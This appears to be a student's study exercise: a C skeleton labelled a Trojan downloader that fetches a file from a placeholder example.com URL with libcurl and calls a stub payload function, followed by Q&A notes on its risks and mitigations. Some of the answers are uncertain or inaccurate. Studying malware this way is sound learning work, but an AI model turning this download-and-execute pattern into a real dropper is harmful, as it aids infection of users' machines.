//Trojan Downloader - Simple version

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

// Function to download a file from a URL
void download_file(const char *url, const char *file_path) {
    CURL *curl;
    FILE *fp;
    CURLcode res;

    curl = curl_easy_init();
    if (curl) {
        fp = fopen(file_path, "wb");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        }
        fclose(fp);
        curl_easy_cleanup(curl);
    }
}

// Function to simulate malicious payload execution
void execute_payload() {
    printf("Malicious payload executed!\n");
    // Malicious actions here
}

// Main function to simulate the Trojan downloader
int main() {
    const char *malicious_url = "http://example.com/malicious_file";
    const char *download_path = "downloaded_malicious_file";

    printf("Downloading malicious file...\n");
    download_file(malicious_url, download_path);
    printf("Download complete.\n");

    printf("Executing malicious payload...\n");
    execute_payload();

    return 0;
}


/*Q&A A simple version of a Trojan Downloader

1 - What is the purpose of the download_file function, and how does it work?
    {
    The download_file function handles the download of the file from a webbrowser to a file path in the users machine
    It has 2 variables which are the URL and the file_path. A Curl is initialized and while curl is true a series of options are set
    (the CURL_URL, the CURL_WRITEFUNCTION which is assigned to NULL[need to understand why] and WRITEDATA which will write the data
    from the URL to the file_path provided/set). It then has a if to handle the errors so if res is not equal to CURL_OK (which I
    assume to be to do with the status code OK 200) then if it is not okay it retrieves an error message. Proceeding with the close fp
    which i need to know why and clearing the curl with curl_easy_cleanup
    }
2 - What is the role of the curl_easy_setopt function in the download_file function? 
    {
    The curl_easy_setopt in the download_file function is used to set the options for the curl function
    }
3 - What potential security risks can you identify in the download_file function?
    {
    No URL input sanitization which can lead to URL redirection, injection of malicious URLs and even potential XSS if the 
    downloaded file is handled insecurely
    Not verifying the SSL/TLS certificate (especially if downloading over HTTPS), which can lead to MIM attacks.
    }
4 - Explain the significance of the execute_payload function and what it represents in this malware.
    {
    The execute_payload function is a demonstrative implementation of the execution of the payload which has no logic and is there 
    solely for demonstration purposes
    }
5 - Suggest potential improvements or mitigations to secure a system against this type of malware.
    {
    Input sanitization on URL;
    Verification of SSL/TLS certificates which can be done still with the "libcurl" by levereging the usage of "CURLOPT_SSL_VERIFYPEER"
    and the Hostname "CURLOPT_SSL_VERIFYHOST" when downloading over HTTPS enhancing security agains MINTM
    Implementing file integrity checks for a post-download verification of the hash to ensure the file was not tampered
    }
*/

